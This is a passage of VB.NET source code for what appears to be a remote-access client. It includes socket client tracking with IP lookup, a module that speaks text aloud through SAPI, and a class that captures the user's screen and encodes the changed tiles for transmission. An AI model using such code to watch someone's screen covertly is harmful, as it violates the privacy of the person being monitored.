                GoTo e
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:
        Disconnect(sock)
        Try
            Online.Remove(sock)
        Catch ex As Exception
        End Try
        RaiseEvent DisConnected(sock)
    End Sub
    Private oIP(9999) As String
    Public Function IP(ByRef sock As Integer) As String
        Try
            oIP(sock) = Split(SK(sock).RemoteEndPoint.ToString(), ":")(0)
            Return oIP(sock)
        Catch ex As Exception
            If oIP(sock) Is Nothing Then
                Return "Error IP grap"
            Else
                Return oIP(sock)
            End If
        End Try
    End Function
End Class
 
Module speaker
    Private Spt As Threading.Thread
    Private Readx As String
    Public Sub SpeakThread(ByVal Sent As String)
        Try
            Readx = Sent
            Spt = New Threading.Thread(AddressOf Speak, 1)

            Spt.Start()
        Catch ex As Exception
            Spt = Nothing

        End Try


    End Sub
    Private Sub Speak()
        Try
            If Readx.Length = Nothing Then
                Exit Sub

            Else
                Dim speechobject
                speechobject = CreateObject("sapi.spvoice")
                speechobject.speak(Readx)
                Spt = Nothing
            End If

        Catch ex As Exception
            Spt = Nothing

        End Try

    End Sub
End Module
Friend Class CRDPx
    Private Shared OA As New List(Of Bitmap)
    Private Shared OAA As New List(Of Point)
    Private Shared OM As New Bitmap(1, 1) ' OLD IMAGE
    Private Shared Function QZ(ByVal q As Integer) As Size '  Lower size of image
        Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Select Case q
            Case 0
                Return zs
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
        Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
        Dim B As New Bitmap(W, H)
        Dim g As Graphics = Graphics.FromImage(B)
        g.CompositingQuality = CompositingQuality.HighSpeed
        g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
        If Sh Then
            Try
                Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
            Catch ex As Exception
            End Try
        End If
        g.Dispose()
        If Wi = 0 And He = 0 Then
            Return B
        Else
            Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
        End If
    End Function
    Private Shared Function md5(ByVal bB As Byte()) As String
        Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
        bB = md5Obj.ComputeHash(bB)
        Return Convert.ToBase64String(bB)
    End Function
    Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
        Dim j As Integer
        Dim encoders As ImageCodecInfo()
        encoders = ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length
            If encoders(j).MimeType = M Then
                Return encoders(j)
            End If
        Next j
        Return Nothing
    End Function
    Shared Sub Clear()
        oQ = -1
        oCo = -1
        oQu = -1
        OM = New Bitmap(1, 1)
    End Sub

    Private Shared oQ As Integer = 0
    Private Shared oCo As Integer = 0
    Private Shared oQu As Integer = 0
    Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
        Dim ZS As New Size(QZ(q))
        ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
        ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
        If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
            OA.Clear()
            OAA.Clear()
            OM = New Bitmap(ZS.Width, ZS.Height)
        End If
        oQ = q
        oCo = co
        oQu = Qu

        Dim A As New List(Of Bitmap)
        Dim AA As New List(Of Point)
        Dim m As Bitmap
        If OA.Count > 0 Then
            A.AddRange(OA.ToArray)
            OA.Clear()
            AA.AddRange(OAA.ToArray)
            OAA.Clear()

            m = OM
            GoTo e
        End If
        m = Gd(ZS.Width, ZS.Height)
        Dim w As Integer = ZS.Width
        Dim h As Integer = ZS.Height
        Dim K As Integer = 0
        For i As Integer = 0 To co - 1
            For ii As Integer = 0 To co - 1
                Dim y As Integer = h / co * i
                Dim x As Integer = w / co * ii
                Dim wc As Integer = w / co
                Dim hc As Integer = h / co
                If wc.ToString.Contains(".") Then
                    wc = Split(wc, ".")(0)
                End If
                If hc.ToString.Contains(".") Then
                    hc = Split(hc, ".")(0)
                End If
                Dim MM As New IO.MemoryStream
                Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim b1 As Byte()
                Dim b2 As Byte()
                Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                b1 = MM.ToArray
                MM.Dispose()
                MM = New IO.MemoryStream
                MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                b2 = MM.ToArray

                MM.Dispose()
                If md5(b1) = md5(b2) Then
                    Mj.Dispose()
                Else
                    A.Add(Mj)
                    AA.Add(New Point(x, y))
                End If
                MJJ.Dispose()
nx:
            Next
        Next
e:

        If A.Count = 0 Then
            Return New Byte() {0}
        End If
        Dim hh As Integer = 0
        Dim QA As New List(Of Integer)
        For i As Integer = 0 To co * co / 5
            If i = A.Count Then Exit For
            QA.Add(i)
            hh += A(i).Height
        Next
        Dim xx As New Bitmap(A(0).Width, hh)
        Dim gg = Graphics.FromImage(xx)
        Dim tp As Integer = 0
        Dim s As String = m.Width & "." & m.Height & ","
        For Each i As Integer In QA
            s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
            gg.DrawImage(A(i), 0, tp)
            tp += A(i).Height
        Next
        s += "sblj3"
        For i As Integer = 0 To A.Count - 1
            If QA.Contains(i) = False Then
                OA.Add(A(i))
                OAA.Add(AA(i))
            End If
        Next
        gg.Dispose()
        Dim JA = New IO.MemoryStream
        Dim eps As EncoderParameters = New EncoderParameters(1)
        eps.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
        Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
        xx.Save(JA, ici, eps)
        Dim J2 As New IO.MemoryStream
        J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
        J2.Write(JA.ToArray, 0, JA.Length)
        OM = m
        xx.Dispose()
        Return J2.ToArray
    End Function
End Class ''Rmote_Desktop_Manager

